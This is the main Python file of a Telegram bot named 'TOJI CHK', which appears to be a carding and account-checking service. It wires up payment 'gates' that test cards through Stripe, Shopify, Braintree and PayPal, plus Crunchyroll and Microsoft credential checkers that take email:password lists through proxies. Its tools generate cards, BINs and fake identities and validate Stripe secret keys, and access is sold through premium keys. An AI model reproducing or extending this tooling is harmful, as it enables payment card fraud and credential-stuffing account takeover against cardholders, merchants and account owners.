import os
import json
import logging
import re
import requests
import asyncio
import time
from datetime import datetime
from typing import Optional
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    ConversationHandler,
    filters,
    ApplicationHandlerStop,
)
from telegram.error import ChatMigrated, TelegramError
from dotenv import load_dotenv
import sys
sys.path.insert(0, 'gates/stripe')
sys.path.insert(0, 'gates/shopify')
sys.path.insert(0, 'gates/braintree')
sys.path.insert(0, 'acc gates/crunchyroll')
from gates.stripe.main import (
    chk_command, 
    mchk_command, 
    setsurl_command, 
    setauth_command,
    receive_auth_mode,
    receive_credentials,
    cancel_command as stripe_cancel,
    AWAITING_AUTH_MODE,
    AWAITING_CREDENTIALS
)
from gates.shopify.main import (
    sh as shopify_sh,
    msh as shopify_msh,
    seturl as shopify_seturl,
    myurl as shopify_myurl,
    rmurl as shopify_rmurl,
    addp as shopify_addp,
    rp as shopify_rp,
    lp as shopify_lp,
    cp as shopify_cp,
    chkurl as shopify_chkurl,
    mchku as shopify_mchku
)
from gates.braintree.bot import (
    br_command as braintree_br,
    mbr_command as braintree_mbr,
    setburl_command as braintree_setburl,
    myburl_command as braintree_myburl,
    rmburl_command as braintree_rmburl,
    baddp_command as braintree_baddp,
    brp_command as braintree_brp,
    blp_command as braintree_blp,
    bcp_command as braintree_bcp,
    chkburl_command as braintree_chkburl,
    mbchku_command as braintree_mbchku,
    receive_auth_mode as braintree_receive_auth_mode,
    receive_credentials as braintree_receive_credentials,
    cancel_braintree,
    AWAITING_AUTH_MODE as BRAINTREE_AWAITING_AUTH_MODE,
    AWAITING_CREDENTIALS as BRAINTREE_AWAITING_CREDENTIALS
)
from cr import CrunchyrollChecker
sys.path.insert(0, 'acc gates/microsoft')
from advanced_hotmail_checker import AdvancedHotmailChecker
import importlib.util
paypal_spec = importlib.util.spec_from_file_location("paypal_processor", "gates/paypal/main.py")
paypal_module = importlib.util.module_from_spec(paypal_spec)
paypal_spec.loader.exec_module(paypal_module)
PayPalProcessor = paypal_module.PayPalProcessor
spec = importlib.util.spec_from_file_location("site_checker", "tools/site gate chk/main.py")
site_checker_module = importlib.util.module_from_spec(spec)
spec.loader.exec_module(site_checker_module)
site_gate_analyze = site_checker_module.analyze_site
site_gate_mass = site_checker_module.analyze_mass_sites
faker_spec = importlib.util.spec_from_file_location("fake", "tools/faker/fake.py")
faker_module = importlib.util.module_from_spec(faker_spec)
faker_spec.loader.exec_module(faker_module)
generate_fake_identity = faker_module.generate_fake_identity
format_fake_identity_message = faker_module.format_fake_identity_message
sk_spec = importlib.util.spec_from_file_location("sk_checker", "tools/sk chk/sk_checker.py")
sk_module = importlib.util.module_from_spec(sk_spec)
sk_spec.loader.exec_module(sk_module)
check_stripe_sk = sk_module.check_stripe_sk
format_sk_check_message = sk_module.format_sk_check_message
from access_control import (
    add_authorized_group,
    is_group_authorized,
    generate_premium_key,
    redeem_key,
    is_premium_user,
    get_key_info,
    clean_expired_premium,
    get_authorized_groups
)

load_dotenv()

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.getenv('BOT_TOKEN')

if not BOT_TOKEN:
    logger.error("❌ BOT_TOKEN not found in environment variables!")
    logger.error("Please set BOT_TOKEN environment variable:")
    logger.error("  export BOT_TOKEN='your_bot_token'")
    logger.error("Or create a .env file with: BOT_TOKEN=your_bot_token")
    sys.exit(1)

ADMIN_USERNAME = os.getenv('ADMIN_USERNAME', 'mumiru')
ADMIN_IDS = []

USERS_FILE = 'users.json'
VIDEO_FILE_ID = None

WAITING_GROUP_LINK = 1
WAITING_GROUP_ID = 2

GBIN_WAITING_TYPE = 3
GBIN_WAITING_DIGITS = 4

MS_WAITING_ACCOUNTS = 5
MS_GLOBAL_SETTINGS = {
    'proxy': None,
    'workers': 25
}

CR_WAITING_ACCOUNTS = 6

def load_users():
    if os.path.exists(USERS_FILE):
        try:
            with open(USERS_FILE, 'r') as f:
                return json.load(f)
        except json.JSONDecodeError as e:
            logger.error(f"Error loading users.json: {e}")
            backup_file = f"{USERS_FILE}.backup"
            logger.warning(f"Creating backup at {backup_file}")
            if os.path.exists(USERS_FILE):
                import shutil
                shutil.copy(USERS_FILE, backup_file)
            return {}
    return {}

def save_users(users):
    try:
        with open(USERS_FILE, 'w') as f:
            json.dump(users, f, indent=2)
    except Exception as e:
        logger.error(f"Error saving users.json: {e}")

def is_registered(user_id):
    users = load_users()
    return str(user_id) in users

def register_user(user_id, username):
    users = load_users()
    users[str(user_id)] = {
        'telegram_id': user_id,
        'username': username,
        'registered_at': datetime.now().isoformat()
    }
    save_users(users)

def is_admin(user_id: int, username: str = None) -> bool:
    """Check if user is admin"""
    if user_id in ADMIN_IDS:
        return True
    if username and username.lower() == ADMIN_USERNAME.lower():
        return True
    return False

async def enforce_access_control(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Middleware to enforce group-only access with premium/admin exceptions"""
    if not update.effective_user or not update.effective_chat:
        return
    
    user_id = update.effective_user.id
    username = update.effective_user.username or ""
    chat_type = update.effective_chat.type
    chat_id = update.effective_chat.id
    
    if is_admin(user_id, username):
        return
    
    authorized_groups = get_authorized_groups()
    
    if chat_type == 'private':
        if is_premium_user(user_id):
            return
        
        groups_list = ""
        if authorized_groups:
            groups_list = "\n\n╔══════════════════════════════╗\n"
            groups_list += "   📢 𝗔𝗨𝗧𝗛𝗢𝗥𝗜𝗭𝗘𝗗 𝗚𝗥𝗢𝗨𝗣𝗦\n"
            groups_list += "╚══════════════════════════════╝\n\n"
            
            for idx, (group_id, group_info) in enumerate(authorized_groups.items(), 1):
                invite_link = group_info.get('invite_link', 'N/A')
                groups_list += f"🔹 Group {idx}\n"
                groups_list += f"   🔗 {invite_link}\n\n"
            
            groups_list += "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            groups_list += "👆 Join any group above to use the bot in the group for free!"
        else:
            groups_list = "\n\n⚠️ No authorized groups available yet.\n📩 Contact @MUMIRU for access."
        
        message = (
            "╔═══════════════════════════════╗\n"
            "   🚫 𝗣𝗥𝗜𝗩𝗔𝗧𝗘 𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗\n"
            "╚═══════════════════════════════╝\n\n"
            "❌ This bot can't be used in private! you can only use the bot in the group \n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "💎 𝗛𝗼𝘄 𝘁𝗼 𝗚𝗲𝘁 𝗔𝗰𝗰𝗲𝘀𝘀:\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "✅ Option 1: Join an group andin those group u can use the bot free \n"
            "✅ Option 2: Get premium key (/redeem <key>)\n"
            f"{groups_list}"
        )
        
        try:
            if update.message:
                await update.message.reply_text(message)
            elif update.callback_query:
                await update.callback_query.answer(
                    "❌ Premium access required for private use!",
                    show_alert=True
                )
        except ChatMigrated as e:
            logger.warning(f"Chat migrated to supergroup: {e.new_chat_id}")
        except TelegramError as e:
            logger.error(f"Telegram error in access control: {e}")
        raise ApplicationHandlerStop
    
    elif chat_type in ['group', 'supergroup']:
        if is_group_authorized(chat_id):
            return
        
        groups_list = ""
        if authorized_groups:
            groups_list = "\n\n╔══════════════════════════════╗\n"
            groups_list += "   ✅ 𝗔𝗨𝗧𝗛𝗢𝗥𝗜𝗭𝗘𝗗 𝗚𝗥𝗢𝗨𝗣𝗦\n"
            groups_list += "╚══════════════════════════════╝\n\n"
            
            for idx, (group_id, group_info) in enumerate(authorized_groups.items(), 1):
                invite_link = group_info.get('invite_link', 'N/A')
                groups_list += f"🔹 Group {idx}\n"
                groups_list += f"   🔗 {invite_link}\n\n"
            
            groups_list += "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            groups_list += "👆 Use the bot in these groups!"
        else:
            groups_list = "\n\n📩 Contact @MUMIRU to authorize this group."
        
        message = (
            "╔════════════════════════════════╗\n"
            "   ⛔ 𝗚𝗥𝗢𝗨𝗣 𝗡𝗢𝗧 𝗔𝗨𝗧𝗛𝗢𝗥𝗜𝗭𝗘𝗗\n"
            "╚════════════════════════════════╝\n\n"
            "❌ This group is not authorized!\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "💡 This bot only works in authorized groups.\n"
            f"{groups_list}"
        )
        
        try:
            if update.message:
                await update.message.reply_text(message)
            elif update.callback_query:
                await update.callback_query.answer(
                    "❌ This group is not authorized!",
                    show_alert=True
                )
        except ChatMigrated as e:
            logger.warning(f"Chat migrated to supergroup: {e.new_chat_id}")
        except TelegramError as e:
            logger.error(f"Telegram error in access control: {e}")
        raise ApplicationHandlerStop

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_registered(user_id):
        await update.message.reply_text(
            "╔═════════════════════════╗\n"
            "     🔰 𝗧𝗢𝗝𝗜 𝗖𝗛𝗞 𝗕𝗢𝗧 🔰\n"
            "╚═════════════════════════╝\n\n"
            "👋 Welcome to TOJI CHK!\n\n"
            "⚠️ You need to register first.\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "📝 Use /register to get started\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🔐 Secure • Fast • Reliable"
        )
        return
    
    await update.message.reply_text(
        "╔═════════════════════════╗\n"
        "     🔰 𝗧𝗢𝗝𝗜 𝗖𝗛𝗞 𝗕𝗢𝗧 🔰\n"
        "╚═════════════════════════╝\n\n"
        f"✅ Welcome back, {update.effective_user.first_name}!\n\n"
        f"👤 User: @{update.effective_user.username or 'N/A'}\n"
        f"🆔 ID: {user_id}\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "💡 Use /cmd to see all commands\n"
        "━━━━━━━━━━━━━━━━━━━━━━"
    )

async def register(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or "Unknown"
    
    if is_registered(user_id):
        await update.message.reply_text(
            "╔════════════════════╗\n"
            "   ✅ 𝗔𝗟𝗥𝗘𝗔𝗗𝗬 𝗥𝗘𝗚𝗜𝗦𝗧𝗘𝗥𝗘𝗗\n"
            "╚════════════════════╝\n\n"
            "You're already registered! 🎉\n"
            "Use /cmd to access features."
        )
        return
    
    register_user(user_id, username)
    await update.message.reply_text(
        "╔════════════════════════╗\n"
        "   🎉 𝗥𝗘𝗚𝗜𝗦𝗧𝗥𝗔𝗧𝗜𝗢𝗡 𝗦𝗨𝗖𝗖𝗘𝗦𝗦\n"
        "╚════════════════════════╝\n\n"
        f"👤 Welcome, @{username}!\n"
        f"🆔 User ID: {user_id}\n\n"
        "✅ You can now use all features!\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "💡 Type /cmd to get started\n"
        "━━━━━━━━━━━━━━━━━━━━━"
    )

async def safe_edit_message(query, text, reply_markup=None):
    try:
        # Check if it's a video message - edit caption instead of text
        if query.message.video:
            await query.edit_message_caption(caption=text, reply_markup=reply_markup)
        else:
            await query.edit_message_text(text, reply_markup=reply_markup)
    except:
        # Fallback: delete and send new message if edit fails
        await query.message.delete()
        await query.message.reply_text(text, reply_markup=reply_markup)

async def cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global VIDEO_FILE_ID
    user_id = update.effective_user.id
    
    if not is_registered(user_id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    
    keyboard = [
        [InlineKeyboardButton("👤 Admin Usernames & Cmds", callback_data='admin')],
        [InlineKeyboardButton("🛠 Tools", callback_data='tools')],
        [InlineKeyboardButton("🚪 Gates", callback_data='gates')],
        [InlineKeyboardButton("📊 Account Checker", callback_data='account_checker')],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    message = (
        "╔══════════════════════════╗\n"
        "     ⚡ 𝗧𝗢𝗝𝗜 𝗖𝗛𝗞 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦 ⚡\n"
        "╚══════════════════════════╝\n\n"
        "🟢 Status: Online • Version: v1.0\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🎯 𝗕𝗮𝘀𝗶𝗰 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀:\n"
        "├ /start - Launch bot ✅\n"
        "├ /register - Sign up ✅\n"
        "└ /cmd - Commands menu ✅\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "👇 Select a category below:"
    )
    
    if VIDEO_FILE_ID:
        sent_message = await update.message.reply_video(
            video=VIDEO_FILE_ID,
            caption=message,
            reply_markup=reply_markup
        )
    else:
        video_path = 'video/toji.mp4'
        with open(video_path, 'rb') as video_file:
            sent_message = await update.message.reply_video(
                video=video_file,
                caption=message,
                reply_markup=reply_markup
            )
        VIDEO_FILE_ID = sent_message.video.file_id

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == 'admin':
        keyboard = [
            [InlineKeyboardButton("👤 Admin Username", callback_data='admin_username')],
            [InlineKeyboardButton("⚙️ Admin Commands", callback_data='admin_cmds')],
            [InlineKeyboardButton("« Back", callback_data='back_main')],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        message_text = (
            "╔═══════════════════╗\n"
            "   👨‍💼 𝗔𝗗𝗠𝗜𝗡 𝗣𝗔𝗡𝗘𝗟\n"
            "╚═══════════════════╝\n\n"
            "🔐 Admin Control Panel\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "👇 Select an option:"
        )
        
        try:
            await safe_edit_message(query, message_text, reply_markup=reply_markup)
        except:
            await query.message.delete()
            await query.message.reply_text(message_text, reply_markup=reply_markup)
    
    elif query.data == 'admin_username':
        keyboard = [[InlineKeyboardButton("« Back", callback_data='admin')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await safe_edit_message(query, "╔═══════════════════════╗\n"
            "   👑 𝗔𝗗𝗠𝗜𝗡 𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘\n"
            "╚═══════════════════════╝\n\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 Admin: @{ADMIN_USERNAME}\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "💬 Contact for support", reply_markup=reply_markup)
    
    elif query.data == 'admin_cmds':
        keyboard = [[InlineKeyboardButton("« Back", callback_data='admin')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await safe_edit_message(query, "╔═════════════════════════╗\n"
            "   ⚙️ 𝗔𝗗𝗠𝗜𝗡 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦\n"
            "╚═════════════════════════╝\n\n"
            "🔧 Administrative Tools\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📊 𝗦𝘁𝗮𝘁𝗶𝘀𝘁𝗶𝗰𝘀 & 𝗨𝘀𝗲𝗿𝘀:\n"
            "├ /stats - Bot statistics ✅\n"
            "└ /users - User list ✅\n\n"
            "🏢 𝗚𝗿𝗼𝘂𝗽 𝗠𝗮𝗻𝗮𝗴𝗲𝗺𝗲𝗻𝘁:\n"
            "├ /addgroup - Add group ✅\n"
            "├ /groups - List groups ✅\n"
            "└ /removegroup - Remove group ✅\n\n"
            "🔑 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗞𝗲𝘆𝘀:\n"
            "└ /key - Generate key ✅\n\n"
            "📢 𝗖𝗼𝗺𝗺𝘂𝗻𝗶𝗰𝗮𝘁𝗶𝗼𝗻:\n"
            "└ /broadcast - Mass message ✅\n\n"
            "━━━━━━━━━━━━━━━━━━━━━", reply_markup=reply_markup)
    
    elif query.data == 'tools':
        keyboard = [[InlineKeyboardButton("« Back", callback_data='back_main')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await safe_edit_message(query, "╔═══════════════════════════╗\n"
            "   🛠 𝗧𝗢𝗢𝗟𝗦 & 𝗨𝗧𝗜𝗟𝗜𝗧𝗜𝗘𝗦\n"
            "╚═══════════════════════════╝\n\n"
            "🎲 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗼𝗿𝘀:\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "├ /gen - Generate cards ✅\n"
            "├ /gbin - Generate BINs ✅\n"
            "└ /fake - Fake identity ✅\n\n"
            "🔍 𝗕𝗜𝗡 𝗧𝗼𝗼𝗹𝘀:\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "├ /bin - Single BIN check ✅\n"
            "└ /mbin - Mass BIN check ✅\n\n"
            "🔑 𝗦𝗞 𝗖𝗵𝗲𝗰𝗸𝗲𝗿:\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "└ /sk - Check Stripe SK ✅\n\n"
            "🌐 𝗦𝗶𝘁𝗲 𝗔𝗻𝗮𝗹𝘆𝘇𝗲𝗿:\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "├ /site - Analyze website ✅\n"
            "└ /msite - Mass analyze ✅\n\n"
            "⚙️ 𝗨𝘁𝗶𝗹𝗶𝘁𝗶𝗲𝘀:\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "├ /split - Split card list ✅\n"
            "├ /clean - Clean CC file ✅\n"
            "├ /info - User info ✅\n"
            "└ /me - My profile ✅\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "✨ All tools are working!", reply_markup=reply_markup)
    
    elif query.data == 'gates':
        keyboard = [
            [InlineKeyboardButton("Shopify", callback_data='gate_shopify')],
            [InlineKeyboardButton("SK Based", callback_data='gate_sk')],
            [InlineKeyboardButton("Stripe", callback_data='gate_stripe')],
            [InlineKeyboardButton("Braintree", callback_data='gate_braintree')],
            [InlineKeyboardButton("CyberSource", callback_data='gate_cyber')],
            [InlineKeyboardButton("PayPal", callback_data='gate_paypal')],
            [InlineKeyboardButton("Unknown Gate", callback_data='gate_unknown')],
            [InlineKeyboardButton("« Back", callback_data='back_main')],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await safe_edit_message(query, "╔═══════════════════════╗\n"
            "   🚪 𝗣𝗔𝗬𝗠𝗘𝗡𝗧 𝗚𝗔𝗧𝗘𝗦\n"
            "╚═══════════════════════╝\n\n"
            "💳 Select Payment Gateway\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "👇 Choose a gate:", reply_markup=reply_markup)
    
    elif query.data == 'gate_shopify':
        keyboard = [[InlineKeyboardButton("« Back", callback_data='gates')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await safe_edit_message(query, 
            "╔═════════════════════╗\n"
            "   🛍 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗚𝗔𝗧𝗘\n"
            "╚═════════════════════╝\n\n"
            "🟢 Status: Active\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "💳 Commands:\n"
            "├ /sh - Single check ✅\n"
            "└ /msh - Mass check (5x) ✅\n\n"
            "━━━━━━━━━━━━━━━━━━",
            reply_markup=reply_markup
        )
    
    elif query.data == 'gate_sk':
        keyboard = [[InlineKeyboardButton("« Back", callback_data='gates')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await safe_edit_message(query, 
            "╔═══════════════════╗\n"
            "   🔑 𝗦𝗞 𝗕𝗔𝗦𝗘𝗗 𝗚𝗔𝗧𝗘\n"
            "╚═══════════════════╝\n\n"
            "🟢 Status: Active\n"
            "━━━━━━━━━━━━━━━━\n\n"
            "💳 Commands:\n"
            "├ /sk - Single check ✅\n"
            "└ /msk - Mass check (5x) ✅\n\n"
            "━━━━━━━━━━━━━━━━",
            reply_markup=reply_markup
        )
    
    elif query.data == 'gate_stripe':
        keyboard = [[InlineKeyboardButton("« Back", callback_data='gates')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await safe_edit_message(query, 
            "╔═══════════════════╗\n"
            "   💳 𝗦𝗧𝗥𝗜𝗣𝗘 𝗚𝗔𝗧𝗘\n"
            "╚═══════════════════╝\n\n"
            "🟢 Status: Partial Active\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "💳 Commands:\n"
            "├ /chk - Single check ✅\n"
            "├ /mchk - Mass check (5x) ✅\n"
            "├ /st - Charged check ❌\n"
            "└ /mst - Mass charged ❌\n\n"
            "━━━━━━━━━━━━━━━━━━",
            reply_markup=reply_markup
        )
    
    elif query.data == 'gate_braintree':
        keyboard = [[InlineKeyboardButton("« Back", callback_data='gates')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await safe_edit_message(query, 
            "╔═════════════════════════╗\n"
            "   🌳 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗚𝗔𝗧𝗘\n"
            "╚═════════════════════════╝\n\n"
            "🟢 Status: Active\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "💳 Commands:\n"
            "└ /br - Single check ✅\n\n"
            "━━━━━━━━━━━━━━━━━━━━━",
            reply_markup=reply_markup
        )
    
    elif query.data == 'gate_cyber':
        keyboard = [[InlineKeyboardButton("« Back", callback_data='gates')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await safe_edit_message(query, "╔═════════════════════════════╗\n"
            "   🔐 𝗖𝗬𝗕𝗘𝗥𝗦𝗢𝗨𝗥𝗖𝗘 𝗚𝗔𝗧𝗘\n"
            "╚═════════════════════════════╝\n\n"
            "🔴 Status: Coming Soon\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "⚠️ Under Development\n"
            "🚧 Check back later!\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━", reply_markup=reply_markup)
    
    elif query.data == 'gate_paypal':
        keyboard = [[InlineKeyboardButton("« Back", callback_data='gates')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await safe_edit_message(query, "╔═══════════════════╗\n"
            "   💰 𝗣𝗔𝗬𝗣𝗔𝗟 𝗚𝗔𝗧𝗘\n"
            "╚═══════════════════╝\n\n"
            "🟢 Status: Online ✅\n"
            "━━━━━━━━━━━━━━━━\n\n"
            "💳 Commands:\n"
            "├ /pp - Single check ✅\n"
            "└ /mpp - Mass check ✅\n\n"
            "━━━━━━━━━━━━━━━━", reply_markup=reply_markup)
    
    elif query.data == 'gate_unknown':
        keyboard = [[InlineKeyboardButton("« Back", callback_data='gates')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await safe_edit_message(query, "╔═══════════════════════╗\n"
            "   ❓ 𝗨𝗡𝗞𝗡𝗢𝗪𝗡 𝗚𝗔𝗧𝗘\n"
            "╚═══════════════════════╝\n\n"
            "🔴 Status: Coming Soon\n"
            "━━━━━━━━━━━━━━━━━━━\n\n"
            "⚠️ Under Development\n"
            "🚧 Stay tuned!\n\n"
            "━━━━━━━━━━━━━━━━━━━", reply_markup=reply_markup)
    
    elif query.data == 'account_checker':
        keyboard = [
            [InlineKeyboardButton("Crunchyroll", callback_data='acc_crunchyroll')],
            [InlineKeyboardButton("Microsoft", callback_data='acc_microsoft')],
            [InlineKeyboardButton("« Back", callback_data='back_main')],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await safe_edit_message(query, "╔═════════════════════════╗\n"
            "   📊 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗖𝗛𝗘𝗖𝗞𝗘𝗥\n"
            "╚═════════════════════════╝\n\n"
            "🟢 Select a service to check\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "👇 Choose a service:", reply_markup=reply_markup)
    
    elif query.data == 'acc_crunchyroll':
        keyboard = [[InlineKeyboardButton("« Back", callback_data='account_checker')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await safe_edit_message(query, 
            "╔═════════════════════════════╗\n"
            "   🎬 𝗖𝗥𝗨𝗡𝗖𝗛𝗬𝗥𝗢𝗟𝗟 𝗖𝗛𝗘𝗖𝗞𝗘𝗥\n"
            "╚═════════════════════════════╝\n\n"
            "🟢 Status: Active\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "💳 Commands:\n"
            "├ /cr - Single check ✅\n"
            "└ /mcr - Mass check ✅\n\n"
            "📝 Usage:\n"
            "`/cr email:password`\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━",
            reply_markup=reply_markup
        )
    
    elif query.data == 'acc_microsoft':
        keyboard = [[InlineKeyboardButton("« Back", callback_data='account_checker')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await safe_edit_message(query, 
            "╔═════════════════════════════╗\n"
            "   🔵 𝗠𝗜𝗖𝗥𝗢𝗦𝗢𝗙𝗧 𝗖𝗛𝗘𝗖𝗞𝗘𝗥\n"
            "╚═════════════════════════════╝\n\n"
            "🟢 Status: Active\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "💳 Commands:\n"
            "├ /ms - Single check ✅\n"
            "├ /mss - Mass check ✅\n"
            "└ /smp - Set proxy (admin) ✅\n\n"
            "📝 Usage:\n"
            "`/ms email:password`\n"
            "`/mss` - Reply to file or send file\n"
            "`/mss email:pass,email:pass`\n"
            "`/smp proxy` (admin)\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━",
            reply_markup=reply_markup
        )
    
    elif query.data == 'back_main':
        keyboard = [
            [InlineKeyboardButton("👤 Admin Usernames & Cmds", callback_data='admin')],
            [InlineKeyboardButton("🛠 Tools", callback_data='tools')],
            [InlineKeyboardButton("🚪 Gates", callback_data='gates')],
            [InlineKeyboardButton("📊 Account Checker", callback_data='account_checker')],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        message = (
            "╔══════════════════════════╗\n"
            "     ⚡ 𝗧𝗢𝗝𝗜 𝗖𝗛𝗞 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦 ⚡\n"
            "╚══════════════════════════╝\n\n"
            "🟢 Status: Online • Version: v1.0\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🎯 𝗕𝗮𝘀𝗶𝗰 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀:\n"
            "├ /start - Launch bot ✅\n"
            "├ /register - Sign up ✅\n"
            "└ /cmd - Commands menu ✅\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "👇 Select a category below:"
        )
        
        await safe_edit_message(query, message, reply_markup=reply_markup)

async def bin_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_registered(update.effective_user.id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    
    if not context.args:
        await update.message.reply_text(
            "❌ Usage: /bin <BIN>\n"
            "Example: /bin 471536"
        )
        return
    
    bin_number = context.args[0][:6]
    
    try:
        response = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=10)
        if response.status_code == 200:
            data = response.json()
            message = (
                f"╔═════════════════════════╗\n"
                f"   ✅ 𝗕𝗜𝗡 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡\n"
                f"╚═════════════════════════╝\n\n"
                f"🔢 BIN: `{data.get('bin', 'N/A')}`\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"💳 Brand: {data.get('brand', 'N/A')}\n"
                f"🌍 Country: {data.get('country_name', 'N/A')} {data.get('country_flag', '')}\n"
                f"🏦 Bank: {data.get('bank', 'N/A')}\n"
                f"📊 Level: {data.get('level', 'N/A')}\n"
                f"🔖 Type: {data.get('type', 'N/A')}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━"
            )
            await update.message.reply_text(message)
        else:
            await update.message.reply_text("❌ BIN not found or invalid.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def mbin_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_registered(update.effective_user.id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    
    if not context.args:
        await update.message.reply_text(
            "❌ Usage: /mbin <BIN1> <BIN2> ...\n"
            "Example: /mbin 471536 440066"
        )
        return
    
    bins = context.args[:10]
    results = []
    
    for bin_number in bins:
        bin_number = bin_number[:6]
        try:
            response = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=10)
            if response.status_code == 200:
                data = response.json()
                results.append(
                    f"✅ {data.get('bin', 'N/A')} - {data.get('brand', 'N/A')} - {data.get('country_name', 'N/A')} {data.get('country_flag', '')}"
                )
            else:
                results.append(f"❌ {bin_number} - Not found")
        except:
            results.append(f"❌ {bin_number} - Error")
    
    await update.message.reply_text(
        "╔════════════════════════╗\n"
        "   🔍 𝗠𝗔𝗦𝗦 𝗕𝗜𝗡 𝗖𝗛𝗘𝗖𝗞\n"
        "╚════════════════════════╝\n\n"
        + "\n".join(results) +
        "\n\n━━━━━━━━━━━━━━━━━━━━━"
    )

async def gbin_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_registered(update.effective_user.id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return ConversationHandler.END
    
    if not context.args:
        await update.message.reply_text(
            "❌ Usage: /gbin <quantity>\n"
            "Example: /gbin 10"
        )
        return ConversationHandler.END
    
    try:
        quantity = int(context.args[0])
        if quantity < 1 or quantity > 50:
            await update.message.reply_text("❌ Please enter a quantity between 1 and 50")
            return ConversationHandler.END
        
        context.user_data['gbin_quantity'] = quantity
        
        await update.message.reply_text(
            "Which BIN type do you want?\n\n"
            "1. Visa 💳\n"
            "2. Mastercard 💳\n"
            "3. American Express 💳\n"
            "4. Discover 💳\n\n"
            "Reply with the number (1-4):"
        )
        return GBIN_WAITING_TYPE
        
    except ValueError:
        await update.message.reply_text("❌ Please enter a valid number")
        return ConversationHandler.END

